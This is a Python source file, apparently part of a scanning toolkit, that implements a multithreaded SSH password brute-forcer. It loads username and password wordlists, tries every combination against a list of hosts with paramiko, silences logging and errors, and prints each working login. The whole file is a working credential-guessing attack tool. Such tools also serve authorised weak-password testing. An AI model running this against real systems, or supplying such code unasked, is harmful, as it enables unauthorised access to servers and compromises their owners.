#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Project : python
@File : ssh_burte.py
@Author : moresuo
@Time : 2026/6/27 10:11
@脚本说明 : ssh爆破
"""
import logging
import threading
import warnings

import paramiko

from tools.ProgressTools import BurteProgress
from tools.SchedulerTools import run_batch
from tools.WordlistTools import load_lines
from tools.color import console

warnings.filterwarnings("ignore")
for _logger_name in ("paramiko", "paramiko.transport"):
    _logger = logging.getLogger(_logger_name)
    _logger.handlers.clear()
    _logger.addHandler(logging.NullHandler())
    _logger.propagate = False
    _logger.setLevel(logging.CRITICAL)

ssh_found_hosts = set()
ssh_found_lock = threading.Lock()


#ssh连接
def ssh_scan(host, port=22, username="root", password=""):
    key = (host, port)
    with ssh_found_lock:
        if key in ssh_found_hosts:
            return
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        ssh_client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=2,
            look_for_keys=False,
            allow_agent=False,
            banner_timeout=2,
            auth_timeout=2,
            compress=False,
            disabled_algorithms={"keys": ["ssh-rsa"]},
        )
        if ssh_client.get_transport() and ssh_client.get_transport().is_alive():
            console.print(f"    [success]✔ SSH   {host}:{port} → {username}/{password}[/success]")
            with ssh_found_lock:
                ssh_found_hosts.add(key)
        try:
            ssh_client.close()
        except Exception:
            pass
    except Exception:
        pass


def _safe_threads(threads, tasks_count):
    if tasks_count <= 0:
        return 1
    return min(max(threads, 1), tasks_count, 100)


#线程池工作，读取用户名文件
def scan_ssh_run_file(hosts, username, password, port=22, threads=500):
    ssh_found_hosts.clear()
    hosts_list = list(hosts)
    users = load_lines(username)
    passwords = load_lines(password)
    tasks_count = len(hosts_list) * len(users) * len(passwords)
    tasks = ((ip, port, user, pwd) for ip in hosts_list for user in users for pwd in passwords)
    safe_threads = _safe_threads(threads, tasks_count)
    with BurteProgress(tasks_count, "SSH弱口令") as progress:
        run_batch(tasks, ssh_scan, safe_threads, on_progress=progress.update)


#指定用户名
def scan_ssh_run(hosts, username, password, port=22, threads=500):
    ssh_found_hosts.clear()
    hosts_list = list(hosts)
    passwords = load_lines(password)
    tasks_count = len(hosts_list) * len(passwords)
    tasks = ((ip, port, username, pwd) for ip in hosts_list for pwd in passwords)
    safe_threads = _safe_threads(threads, tasks_count)
    with BurteProgress(tasks_count, "SSH弱口令") as progress:
        run_batch(tasks, ssh_scan, safe_threads, on_progress=progress.update)
